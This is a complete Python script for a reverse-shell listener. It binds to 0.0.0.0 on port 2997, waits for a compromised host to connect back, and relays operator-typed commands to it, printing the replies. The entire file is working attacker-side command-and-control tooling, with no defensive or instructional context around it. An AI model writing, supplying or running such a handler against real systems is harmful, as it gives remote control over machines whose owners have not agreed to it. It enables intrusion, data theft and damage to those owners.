import socket

def start_listener(host='0.0.0.0', port=2997):
    """
    A Python-based netcat-like listener that accepts connections and sends commands to a reverse shell.
    """
    try:
        # Create a TCP socket
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Enable port reuse
        server_socket.bind((host, port))
        server_socket.listen(1)
        print(f"[+] Listening on {host}:{port}")

        # Accept a single connection
        client_socket, client_address = server_socket.accept()
        print(f"[+] Connection established from {client_address}")

        while True:
            # Get user input (command to send)
            command = input("shell> ")

            # Exit if user types 'exit' or 'quit'
            if command.lower() in ['exit', 'quit']:
                print("[+] Closing connection.")
                client_socket.sendall(b"exit\n")
                break

            # Send the command to the client
            client_socket.sendall((command + "\n").encode('utf-8'))

            # Receive and print the response from the client
            response = client_socket.recv(4096).decode('utf-8')  # Adjust buffer size if needed
            print(response)

        client_socket.close()
        server_socket.close()

    except Exception as e:
        print(f"[!] Error: {e}")
        if 'client_socket' in locals():
            client_socket.close()
        if 'server_socket' in locals():
            server_socket.close()

if __name__ == "__main__":
    start_listener()
